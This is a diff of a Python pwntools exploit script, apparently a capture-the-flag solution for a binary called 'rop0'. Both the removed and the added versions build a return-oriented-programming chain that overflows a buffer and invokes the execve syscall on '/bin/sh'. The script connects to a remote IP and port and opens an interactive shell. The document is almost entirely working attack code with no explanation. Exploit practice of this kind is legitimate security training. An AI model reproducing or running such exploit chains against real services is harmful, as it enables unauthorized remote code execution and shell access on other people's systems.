@@ -1,90 +1,19 @@
 from pwn import *
-from struct import pack
 
-# Padding goes here
-p = ''
+context.arch = 'amd64'
 
-p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
-p += pack('<Q', 0x00000000006ca080) # @ .data
-p += pack('<Q', 0x0000000000478616) # pop rax ; pop rdx ; pop rbx ; ret
-p += '/bin//sh'
-p += pack('<Q', 0x4141414141414141) # padding
-p += pack('<Q', 0x4141414141414141) # padding
-p += pack('<Q', 0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
-p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
-p += pack('<Q', 0x00000000006ca088) # @ .data + 8
-p += pack('<Q', 0x00000000004260ef) # xor rax, rax ; ret
-p += pack('<Q', 0x00000000004740c1) # mov qword ptr [rsi], rax ; ret
-p += pack('<Q', 0x0000000000401516) # pop rdi ; ret
-p += pack('<Q', 0x00000000006ca080) # @ .data
-p += pack('<Q', 0x0000000000401637) # pop rsi ; ret
-p += pack('<Q', 0x00000000006ca088) # @ .data + 8
-p += pack('<Q', 0x00000000004428e6) # pop rdx ; ret
-p += pack('<Q', 0x00000000006ca088) # @ .data + 8
-p += pack('<Q', 0x00000000004260ef) # xor rax, rax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004a361b) # inc eax ; ret
-p += pack('<Q', 0x00000000004003da) # syscall
+bin_sh = 0x6ccd60
+pop_radbx_ret = 0x478616
+pop_rdi_ret = 0x401516
+syscall = 0x4672b5
+pop_rsi_ret = 0x401637
+payload = flat(['A'*0x28, pop_rsi_ret, 0, pop_radbx_ret, 0x3b, 0, 0, pop_rdi_ret, bin_sh, syscall])
 
-# r = process('./rop0')
+
+#r = process('./rop0')
 r = remote('140.110.112.31', 3121)
-offset = 'a' * 340
-r.send(offset + p)
+r.sendline('/bin/sh\x00')
+print r.recvline()
+r.send(payload)
+print r.recvline()
 r.interactive()
